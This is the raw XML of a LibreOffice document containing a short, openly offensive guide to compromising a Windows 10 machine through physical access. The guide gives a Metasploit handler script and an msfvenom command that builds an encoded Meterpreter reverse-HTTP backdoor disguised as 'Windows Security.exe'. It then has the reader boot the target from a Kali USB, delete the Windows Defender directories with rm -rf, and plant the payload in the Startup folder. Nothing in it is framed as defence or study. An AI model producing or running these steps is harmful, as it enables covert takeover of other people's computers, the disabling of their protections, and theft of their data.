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normal" fo:font-weight="normal" officeooo:rsid="001d0adc" officeooo:paragraph-rsid="001d0adc" style:font-size-asian="17.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="20pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="20pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001d3d4c" officeooo:paragraph-rsid="001d3d4c" style:font-size-asian="17.5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font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001d0adc" officeooo:paragraph-rsid="001d0ad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d3d4c" officeooo:paragraph-rsid="001d3d4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c9211e" loext:opacity="100%" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001d0adc" officeooo:paragraph-rsid="001d0ad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c9211e" loext:opacity="100%" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001d3d4c" officeooo:paragraph-rsid="001d3d4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5pt" fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="001d3d4c" officeooo:paragraph-rsid="001d3d4c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d3d4c"/>
    </style:style>
    <style:style style:name="T2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king into Windows 10 (Requires Physical Access)</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P7">Pre-Exploit</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">Create a Live USB running Kali Linux</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Create a resource script:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5">nano ~/a<text:span text:style-name="T1">ut</text:span>omate.rc</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P3">Paste this into the nano terminal:</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">use multi/handler</text:p>
      <text:p text:style-name="P5">set payload windows/meterpreter/reverse_http</text:p>
      <text:p text:style-name="P5">set LHOST [Attacker’s Ip Here]</text:p>
      <text:p text:style-name="P5">set LPORT 80</text:p>
      <text:p text:style-name="P5">set ExitOnSession false</text:p>
      <text:p text:style-name="P5">set EnableStageEncoding true</text:p>
      <text:p text:style-name="P5">exploit -j -z</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Start msfconsole with this command:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5">msfconsole -r ~/automate.rc</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Create the payload using msfvenom:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5">msfvenom –encoder cmd/powershell_base64 –payload windows/meterpreter/reverse_http LHOST=[Attacker’s IP Here] LPORT=80 –arch x86 –platform win –format exe –out ~/’Windows Security.exe’</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P3">After generating this payload, save it to a second USB drive</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P7">Exploit</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P4">Boot the target device with the Live USB</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Mount the Windows volume (Double Click)</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Disable defenses:</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P6">find /media/root/ -type d -iname *Windows\ Defender*</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Remove all of these directories with:</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P6">find /media/root/ -type d -iname *Windows\ Defender* -exec rm -rf</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Navigate to<text:span text:style-name="T2"> ‘C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp’</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">If the filesystem is locked, the file must be dragged from the USB to the folder</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:soft-page-break/>Unmount the Windows volume</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Shut down the computer, start a metasploit listener, and wait for the target computer to be turned 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7T17:25:33.726602023</meta:creation-date>
    <dc:date>2021-03-07T17:46:37.015728548</dc:date>
    <meta:editing-duration>PT2S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="29" meta:word-count="173" meta:character-count="1218" meta:non-whitespace-character-count="1074"/>
    <meta:generator>LibreOffice/7.0.3.1$Linux_X86_64 LibreOffice_project/00$Build-1</meta:generator>
  </office:meta>
</office:document-meta>
</file>